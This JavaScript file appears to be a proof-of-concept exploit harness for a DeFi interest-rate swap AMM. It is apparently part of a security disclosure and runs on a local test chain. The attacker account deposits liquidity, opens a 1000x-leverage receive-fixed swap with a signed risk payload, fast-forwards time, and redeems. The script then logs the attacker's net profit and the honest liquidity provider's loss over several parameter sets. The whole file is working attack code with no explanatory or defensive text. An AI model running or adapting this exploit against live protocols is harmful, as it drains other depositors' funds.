const { main, RISK_BASE, signRisk, E18, PAD } = require('./poc');
const TENORS = { 28: 0n, 60: 1n, 90: 2n };
const INDEX = 5n * 10n ** 16n;
const f = (x) => (Number(x) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 0 });

async function run({ days, collateralUsdc, leverage, honestUsdc, atkUsdc }) {
  const tenor = TENORS[days];
  const c = await main({ openingFeeRate: 5n * 10n ** 14n });
  const { P, usdc, ipToken, oracle, ammStorage, provider, atk, lp, msgSignerWallet, pools, openViaRouter } = c;
  const atkAddr = await atk.getAddress(), lpAddr = await lp.getAddress();
  await c.give(lp, PAD(honestUsdc)); await c.give(atk, PAD(atkUsdc));
  await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, PAD(honestUsdc), { gasLimit: 5e6 })).wait();
  await (await pools.connect(atk).provideLiquidityUsdc(atkAddr, PAD(atkUsdc), { gasLimit: 5e6 })).wait();
  await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: INDEX, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();
  const k = (leverage * 5n * 10n ** 14n * BigInt(days)) / (365n * E18);
  const totalUsdc = ((PAD(collateralUsdc) * 10n ** 12n * (E18 + k)) / E18 + 35n * E18) * 10n ** 6n / E18 + 2n;
  await c.give(atk, totalUsdc);
  const now = BigInt((await provider.getBlock('latest')).timestamp);
  const ins = { ...RISK_BASE, expiration: now + 3600n };
  const fn = `openSwapReceiveFixed${days}daysUsdc`;
  await (await openViaRouter.connect(atk)[fn](atkAddr, totalUsdc, 0n, leverage,
    { ...ins, signature: signRisk(msgSignerWallet, ins, P.usdc, tenor, 1n) }, { gasLimit: 9e6 })).wait();
  const swap = await ammStorage.getSwap(1, 1); // (direction = receive fixed, swapId = 1)
  await provider.send('evm_increaseTime', [days * 86400 + 60]); await provider.send('evm_mine', []);
  let got = 0n;
  const atkIp = await ipToken.balanceOf(atkAddr);
  try {
    const before = await usdc.balanceOf(atkAddr);
    await (await pools.connect(atk).redeemFromAmmPoolUsdc(atkAddr, atkIp, { gasLimit: 9e6 })).wait();
    got = (await usdc.balanceOf(atkAddr)) - before;
  } catch (e) { got = 0n; }
  // the honest LP now owns 100% of the remaining ipUSDC, so everything left in the treasury is his
  const cash = await usdc.balanceOf(P.treasury);
  const profit = got - PAD(atkUsdc) - totalUsdc;
  console.log(`days=${days} C=${collateralUsdc} lev=${leverage / E18}x notional=${f(swap.notional / 10n ** 12n)} fixed=${(Number(swap.fixedInterestRate) / 1e16).toFixed(3)}% atk_spend=${f(PAD(atkUsdc) + totalUsdc)} atk_out=${f(got)} ATK_NET=${profit > 0n ? '+' : '-'}${f(profit < 0n ? -profit : profit)} LP_LOSS=${f(PAD(honestUsdc) - cash)} cash_left=${f(cash)}`);
}

(async () => {
  const cases = [
    { days: 28, collateralUsdc: 74_000, leverage: 1000n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 60, collateralUsdc: 74_000, leverage: 1000n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 90, collateralUsdc: 74_000, leverage: 1000n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 90, collateralUsdc: 20_000, leverage: 1000n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 90, collateralUsdc: 99_000, leverage: 1000n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 90, collateralUsdc: 74_000, leverage: 100n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 90, collateralUsdc: 74_000, leverage: 200n * E18, honestUsdc: 500_000, atkUsdc: 500_000 },
    { days: 90, collateralUsdc: 74_000, leverage: 1000n * E18, honestUsdc: 1_000_000, atkUsdc: 250_000 },
  ];
  for (const cs of cases) { try { await run(cs); } catch (e) { console.log('case failed', cs.days+"d C="+cs.collateralUsdc+" lev="+(cs.leverage/E18)+"x", e.shortMessage || e.message); } }
})();
